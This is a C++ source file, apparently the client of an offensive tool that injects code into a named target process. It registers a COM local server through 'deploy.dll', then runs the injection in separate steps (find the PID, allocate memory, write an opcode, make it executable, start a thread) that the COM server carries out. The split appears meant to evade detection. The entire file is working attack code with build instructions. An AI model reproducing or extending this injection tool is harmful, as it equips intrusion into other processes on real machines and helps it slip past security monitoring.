// Compile with:
// "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
// cl.exe /MT /EHsc /Fe:client.exe client.cpp ole32.lib oleaut32.lib

#include <windows.h>
#include <iostream>
#include <objbase.h>
#include "splitproc.h"

const GUID CLSID_MySimpleServer = { 0xb0a7e410, 0x1f7c, 0x4b1a, { 0x8e, 0xb, 0xa, 0xc, 0x6d, 0x7e, 0x12, 0x34 } };

IUnknown* pUnknown = nullptr;


void deploy_server()	// creates entries in the registry
{
	LoadLibrary("deploy.dll");
}
void step(split_command c)
{
	// 1. create or replace the file with the command.
	// 2. CoCreateInstance(CLSID_MySimpleServer, NULL, CLSCTX_LOCAL_SERVER, IID_IUnknown, (LPVOID*)&pUnknown);.
	
	std::cout<<"Starting step "<<std::endl;
	HANDLE step_file = CreateFileA("split.step", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD command = static_cast<DWORD>(c);
	DWORD bytesWritten;
	WriteFile(step_file,&command,sizeof(DWORD),&bytesWritten, NULL); // save the step value in the file
	CloseHandle(step_file);	
	
	// invoke the COM server process
	CoCreateInstance(CLSID_MySimpleServer, NULL, CLSCTX_LOCAL_SERVER, IID_IUnknown, (LPVOID*)&pUnknown);
	
	// could also add file removal call here
}
void inject_opcode()
{
	step(split_command::GET_PID);
	step(split_command::ALLOCATE_MEM);
	step(split_command::GENERATE_OPCODE);
	step(split_command::WRITE_MEM);
	step(split_command::MEM_EXECUTABLE);
	step(split_command::THREAD_TRIGGER);
}
void usage()
{
	    std::cout << "No arguments provided. Usage: client.exe deploy | client.exe inject target_process_name\n";
        ExitProcess(0);
}
int main(int argc, char* argv[]) 
{
    // Check if there are any command line arguments
    if (argc == 1) {
		usage();
    }
	if(argc == 2) // one argument
	{
		if(strcmp(argv[1],"deploy")==0)
		{
			std::cout<<"Deploying registry entry.\n"<<std::endl;
			deploy_server();
			return 0;
		}
		usage();
	}
	if(argc == 3)
	{
		if(strcmp(argv[1],"inject")==0)
		{
			HANDLE hFile = CreateFileA("proc.name", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			DWORD bytesWritten;
			WriteFile(hFile, argv[2], strlen(argv[2]), &bytesWritten, NULL); // just rewrite the second argument to the file
			CloseHandle(hFile);
			
			HRESULT hr=CoInitializeEx(NULL, COINIT_MULTITHREADED);
			if (FAILED(hr))
			{
				std::wcerr << L"Failed to initialize COM library. Error code: " << std::hex << hr << std::endl;
				return hr;
			}			
			inject_opcode();
			CoUninitialize();
			return 0;
		}
		else
		usage();
	}
	usage();
	return 0;
}